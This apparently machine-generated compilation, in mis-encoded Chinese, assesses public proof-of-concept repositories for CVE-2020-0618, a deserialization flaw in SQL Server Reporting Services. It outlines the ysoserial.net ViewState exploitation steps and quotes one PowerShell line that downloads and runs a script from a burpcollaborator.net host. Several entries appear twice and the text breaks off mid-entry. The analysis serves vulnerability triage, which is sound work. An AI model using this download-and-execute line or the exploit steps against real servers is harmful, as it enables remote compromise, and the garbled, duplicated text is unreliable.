**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼é€šå¸¸æ¶‰åŠæ„é€ æ¶æ„çš„.NET ViewStateï¼Œå°†å…¶ä½œä¸ºè¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€åˆ°SSRSæœåŠ¡å™¨ã€‚æœåŠ¡å™¨åœ¨ååºåˆ—åŒ–ViewStateæ—¶ï¼Œä¼šæ‰§è¡Œæ”»å‡»è€…é¢„å…ˆè®¾å®šçš„æ¶æ„ä»£ç ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»è€…å¯èƒ½éœ€è¦å…ˆæ‰¾åˆ°æœ‰æ•ˆçš„ViewStateï¼Œç„¶åæ›¿æ¢å…¶ä¸­çš„éƒ¨åˆ†å†…å®¹ï¼Œæˆ–è€…ç”Ÿæˆå…¨æ–°çš„æ¶æ„ViewStateã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**
è¯¥ä»£ç åº“ä¸»è¦æ˜¯ä¸€ä¸ªèœœç½ï¼Œå…¶ç›®çš„æ˜¯**æ£€æµ‹**è€Œé**åˆ©ç”¨**æ¼æ´ã€‚ ä»£ç åŒ…å«ç”¨äºæ¨¡æ‹ŸSSRSæœåŠ¡å™¨è¡Œä¸ºçš„éƒ¨åˆ†ï¼Œä»¥åŠç”¨äºè®°å½•è¯·æ±‚å’Œé”™è¯¯çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚ ä½†æ˜¯,ä»ç„¶å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ï¼Œä¾‹å¦‚ï¼š

*   **è™šå‡æ—¥å¿—ï¼š** æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ—¥å¿—è®°å½•éƒ¨åˆ†ï¼Œä½¿å…¶æŠ¥å‘Šè™šå‡ä¿¡æ¯ï¼Œè¯¯å¯¼å®‰å…¨åˆ†æäººå‘˜ã€‚
*   **èµ„æºæ¶ˆè€—ï¼š** æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ä»£ç ï¼Œä½¿å…¶åœ¨æ¥æ”¶åˆ°ç‰¹å®šç±»å‹çš„è¯·æ±‚æ—¶æ¶ˆè€—å¤§é‡èµ„æºï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

è€ƒè™‘åˆ°ä»£ç åº“çš„èœœç½æ€§è´¨å’Œç°æœ‰åŠŸèƒ½ï¼Œåˆ¤å®šæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†ä¸èƒ½å®Œå…¨æ’é™¤ã€‚ é£é™©è¯„ä¼°åœ¨5%ã€‚

**é¡¹ç›®åœ°å€:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**æ¥æº**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿå‘ReportServer/pages/ReportViewer.aspxå‘é€POSTè¯·æ±‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618 æ˜¯ Microsoft SQL Server Reporting Services (SSRS) ä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æºäº SSRS åœ¨å¤„ç†é¡µé¢è¯·æ±‚æ—¶å­˜åœ¨ä¸æ­£ç¡®çš„ååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„ `ViewState` å‚æ•°ï¼Œå°†å…¶æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚ä¸­ï¼Œåˆ©ç”¨ `LosFormatter` ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç ã€‚æä¾›çš„ PoC ä½¿ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload ä½¿ç”¨ `TypeConfuseDelegate` gadget chainï¼Œå¹¶é€šè¿‡ PowerShell æ‰§è¡Œåå‘è¿æ¥ shell å‘½ä»¤ã€‚ 

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  ä½¿ç”¨ `ysoserial.net` å·¥å…·ç”Ÿæˆæ¶æ„çš„ `ViewState` Payloadã€‚
2.  å°† Payload æ’å…¥åˆ°å‘å¾€ `ReportServer/pages/ReportViewer.aspx` çš„ POST è¯·æ±‚çš„ `NavigationCorrector$ViewState` å‚æ•°ä¸­ã€‚
3.  å‘é€ç²¾å¿ƒæ„é€ çš„ POST è¯·æ±‚åˆ°ç›®æ ‡æœåŠ¡å™¨ã€‚
4.  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼ŒæœåŠ¡å™¨å°†æ‰§è¡Œ Payload ä¸­åŒ…å«çš„æ¶æ„ä»£ç ã€‚

**æŠ•æ¯’é£é™©åˆ†æï¼š**

è¯¥ PoC ä»£ç ä¸»è¦åˆ©ç”¨ `ysoserial.net` ç”Ÿæˆ Payloadï¼Œè¯¥ Payload è¾ƒä¸ºå¸¸è§ï¼Œä¸»è¦é£é™©å­˜åœ¨äºæ‰§è¡Œçš„ Powershell è„šæœ¬ã€‚è„šæœ¬å†…å®¹æœ¬èº«æ˜¯ä¸ºäº†å»ºç«‹åå‘ shellï¼Œä½†è‹¥æ”»å‡»è€…ä¿®æ”¹è„šæœ¬ä¸­çš„ IP åœ°å€æˆ–ç«¯å£ï¼Œå¯èƒ½å¯¼è‡´å—å®³è€…è¿æ¥åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼Œä»è€Œæ³„éœ²ä¿¡æ¯æˆ–è¢«è¿›ä¸€æ­¥æ§åˆ¶ã€‚ä»“åº“æœ¬èº«ä¹Ÿå¯èƒ½è¢«å…¶ä»–äººç¯¡æ”¹ã€‚ç»¼åˆè€ƒè™‘ï¼ŒæŠ•æ¯’é£é™©çº¦ä¸º 10%ã€‚

**é¡¹ç›®åœ°å€:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**æ¥æº**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬SQL Server 2012 SP4, 2014 SP3, 2016 SP2 ç­‰ï¼Œå…·ä½“å‚è€ƒæ¼æ´åº“ä¿¡æ¯

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®SSRSæœåŠ¡çš„webé¡µé¢

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªå­˜åœ¨äºMicrosoft SQL Server Reporting Servicesä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚å¯¼è‡´çš„ï¼Œæ›´å…·ä½“åœ°è¯´ï¼Œæ˜¯ç”±äº`ViewState`ååºåˆ—åŒ–æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ç‰¹åˆ¶çš„é¡µé¢è¯·æ±‚ï¼Œåˆ©ç”¨ä¸å®‰å…¨çš„`LosFormatter`ååºåˆ—åŒ–è¿‡ç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒä½¿ç”¨äº†`ysoserial.net`å·¥å…·ç”Ÿæˆæ¶æ„çš„åºåˆ—åŒ–payloadï¼Œå¹¶ä½¿ç”¨`TypeConfuseDelegate` gadgetï¼Œè¯¥gadgetå¸¸ç”¨äº.NETååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ã€‚Payloadä¸­åµŒå…¥äº†powershellå‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é€šè¿‡`iwr`ä¸‹è½½å¹¶æ‰§è¡Œè¿œç¨‹è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**
è¯¥ä»“åº“å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦çš„æ¼æ´åˆ©ç”¨ä»£ç çœ‹èµ·æ¥æ˜¯åˆç†çš„ï¼Œä½†ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š
*   POCä»£ç ä¸­çš„`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`ï¼Œè¯¥URLæŒ‡å‘ä¸€ä¸ªå¤–éƒ¨èµ„æºï¼Œå¦‚æœè¯¥èµ„æºè¢«ç¯¡æ”¹ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
*   è™½ç„¶åˆ©ç”¨ä»£ç çœ‹èµ·æ¥åƒæ˜¯åˆæ³•çš„åˆ©ç”¨ï¼Œä½†ä»ç„¶è¦è°¨æ…ï¼Œç”±äº `burpcollaborator.net` åŸŸåæ˜¯ä¸€ç§å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œè™½ç„¶åœ¨æœ¬æ¬¡ä¸Šä¸‹æ–‡ä¸­ä¸ä¸€å®šæ˜¯æ¶æ„çš„ï¼Œä½†ä¹Ÿå¢åŠ äº†æŠ•æ¯’çš„æ¦‚ç‡.
ç»¼åˆè€ƒè™‘ï¼Œè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚ä¸»è¦é£é™©åœ¨äºå¤–éƒ¨URLå’Œæ½œåœ¨çš„payloadã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦ç¡®å®šç›®æ ‡SSRSæœåŠ¡å™¨å­˜åœ¨CVE-2020-0618æ¼æ´ã€‚
2.  ä½¿ç”¨`ysoserial.net`å·¥å…·ï¼ŒåŸºäº`TypeConfuseDelegate` gadgetå’Œ`LosFormatter`æ ¼å¼ï¼Œç”ŸæˆåŒ…å«æ¶æ„powershellå‘½ä»¤çš„åºåˆ—åŒ–payloadã€‚
3.  æ¶æ„powershellå‘½ä»¤ä¼šè¢«ç¼–ç æˆBase64å­—ç¬¦ä¸²ã€‚
4.  æ”»å‡»è€…æ„é€ åŒ…å«è¯¥payloadçš„æ¶æ„è¯·æ±‚ï¼Œå‘é€åˆ°SSRSæœåŠ¡å™¨çš„webé¡µé¢ã€‚æ¼æ´åˆ©ç”¨é“¾å¤§è‡´å¦‚ä¸‹ï¼šç½‘é¡µè¯·æ±‚->ViewState->LosFormatterååºåˆ—åŒ–->TypeConfuseDelegate -> Powershell RCE
5.  SSRSæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶ï¼Œä¼šååºåˆ—åŒ–`ViewState`ï¼Œç”±äº`LosFormatter`çš„ä¸å®‰å…¨æ€§ï¼Œä¼šå¯¼è‡´ä»£ç æ‰§è¡Œã€‚`TypeConfuseDelegate` gadgetä¼šå°†ååºåˆ—åŒ–è¿‡ç¨‹å¯¼å‘æ¶æ„ä»£ç ã€‚
6.  æœ€ç»ˆï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œpayloadä¸­åµŒå…¥çš„powershellå‘½ä»¤ï¼Œæ”»å‡»è€…ä»è€Œè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œçš„èƒ½åŠ›ã€‚

**é¡¹ç›®åœ°å€:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**æ¼æ´è¯¦æƒ…:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**æ¥æº**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**æ¼æ´ç¼–å·:** CVE-2020-0618

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Microsoft SQL Server Reporting Services (SSRS)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æ§åˆ¶

**å½±å“ç‰ˆæœ¬:** å—å½±å“ç‰ˆæœ¬åŒ…æ‹¬ä½†ä¸é™äºï¼šMicrosoft SQL Server 2012, 2014, 2016

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦èƒ½å¤Ÿè®¿é—®å­˜åœ¨æ¼æ´çš„SSRSæœåŠ¡ï¼Œé€šå¸¸æ˜¯WebæœåŠ¡ç«¯å£

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2020-0618æ˜¯ä¸€ä¸ªMicrosoft SQL Server Reporting Services (SSRS) ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ŒæºäºSSRSæœªèƒ½æ­£ç¡®å¤„ç†é¡µé¢è¯·æ±‚ã€‚è¯¥æ¼æ´æ˜¯ç”±äº.NET ViewStateååºåˆ—åŒ–æ—¶æœªè¿›è¡Œå……åˆ†çš„è¾“å…¥éªŒè¯å¯¼è‡´çš„ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**
æ ¹æ®æä¾›çš„æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œè¯¥æ¼æ´æ˜¯çœŸå®å­˜åœ¨çš„ï¼Œå¹¶ä¸”æœ‰å…¬å¼€çš„PoCï¼ˆProof of Conceptï¼‰ä»£ç å¯ç”¨ã€‚æä¾›çš„ä»£ç æ˜¯ä¸€ä¸ªèœœç½ï¼Œæ—¨åœ¨æ£€æµ‹åˆ©ç”¨CVE-2020-0618çš„æ”»å‡»å°è¯•ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨è¯¥æ¼æ´ã€‚èœœç½é€šè¿‡æ¨¡æ‹ŸSSRSæœåŠ¡ï¼Œè®°å½•æ‰€æœ‰è¯·æ±‚ï¼Œç‰¹åˆ«æ˜¯é‚£äº›è¯•å›¾è§¦å‘æ¼æ´çš„è¯·æ±‚ã€‚

